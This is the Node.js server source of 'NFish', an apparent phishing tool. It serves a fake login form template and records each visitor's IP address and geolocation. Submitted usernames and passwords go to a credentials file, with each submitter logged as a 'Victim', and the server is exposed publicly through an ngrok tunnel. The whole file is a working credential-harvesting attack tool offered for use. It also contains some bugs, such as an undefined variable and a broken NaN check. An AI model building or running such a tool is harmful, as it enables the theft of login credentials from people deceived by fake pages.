const path = require('path');
const fs = require('fs')

const express = require('express');
const bodyParser = require('body-parser');

const iplocate = require('node-iplocate');
const http = require('http');

const connectToWorld = require('./ngrokHandler');

const process = require('process')
const { Command } = require('commander');
const { exit } = require('process');
var { version, description } = require(path.join(__dirname, '../package.json'));
version += "-stable"

const program = new Command();
program.name("NFish@"+version)
program.description(description)

program.option('--no-tunnel', "Don't use default NGROK service for tunneling (Default false)")
program.option('--no-iploc', "Don't Locate the IP Addr (uses iplocate.io api with 1000-Requests/day) (Default false)")
program.option('-p, --port <int>', 'Port number, which server will use (Default 8080).')
program.option('-t, --template <str>', 'Fake phishing form template to use (Default template/index.html).')
program.option('-v, --version', 'Show Program Version.')

var args = program.parse(process.argv).opts()
// Flip the value because it is by default true.
args.tunnel = !args.tunnel
// args.iploc = !args.iploc

if (args.help) {
	program.help();
} else if (args.version) {
	console.log(version);
}

if (args.port) {
	args.port = parseInt(args.port)
	if (args.port == NaN) {
		args.port = 8080
	}
} else {
	args.port = 8080
}

const server = require('http')
	.createServer()
	.listen(args.port, () => {
		server.close()
	})
	.on('error', () => {
		console.error("Error: Port " + args.port + " is in Use...");
		exit(1)
	})

if (args.template) {
	fs.stat(path.resolve(args.template), function(err, stat) {
		if (err == null) {
			args.template = path.resolve(args.template)
		} else if (err.code === 'ENOENT') {
			console.log("Error: Template Doesn't Exists...");
			program.help()
			exit(1)
		} else {
			console.log('Unknown Error Occured: ' + err.code);
			console.log(err.message);
			console.log('You Can Report this error at https://github.com/DEVLOPRR/NFish/issues/new');
			exit(1)
		}
	});
} else {
	args.template = path.resolve(path.join(__dirname, "../templates/index.html"))
}

async function addJSON(file, data={}) {
	let jsonFile = fs.readFileSync(file, { encoding: 'utf-8' })
	let jsonParsed = JSON.parse(jsonFile)
	jsonParsed.push(data)
	let jsonString = JSON.stringify(jsonParsed)
	fs.writeFileSync(file, jsonString, { encoding: 'utf-8' })
	return jsonString
}

const app = express();

app.use(bodyParser.urlencoded({extended : true}));
app.use(bodyParser.json());

app.get('/', function(request, response) {
	response.sendFile(args.template);
	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
	console.log(ip + " Connected To Server.");

	if (args.iploc) {
		iplocate(ip).then((results) => {
			addJSON(
				path.resolve(path.join(__dirname, '../output/ipAddr.json')),
				results
			)		
		});
	} else {
		addJSON(
			path.resolve(path.join(__dirname, '../output/ipAddr.json')),
			{
				ip: ip
			}
		)		
	}
});

app.post('/validate', function(request, response) {
	const username = request.body.username;
	const password = request.body.password;
	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
	console.log(ip + " is now a Victim");
	if (username && password) {
		console.log("USR: " + username);
		console.log("PASWD: " + password);
		addJSON(
			path.resolve(path.join(__dirname, '../output/credentials.json')),
			{
				usrname: username,
				passwd: password
			}
		)

		if (args.iploc) {
			iplocate(ip).then((results) => {
				addJSON(
					path.resolve(path.join(__dirname, '../output/ipAddr.json')),
					{
						ip: ip
					}
				)		
			});
		}
	
		response.redirect('/?valid=true')
		response.end();
	} else {
		response.redirect('/?valid=false')
		response.end();
	}
});

app.listen(args.port, '127.0.0.1', () => {
	console.log("Server Started on http://127.0.0.1:" + args.port + " ...")
	if (args.tunnel == true) { // if args.tunnel is true, which can only be if user doesn't want to use NGROK
		console.log("Not Using NGROK Service...");
	} else {
		console.log("Starting NGROK Service...");
		connectToWorld(args.port)
	}
});
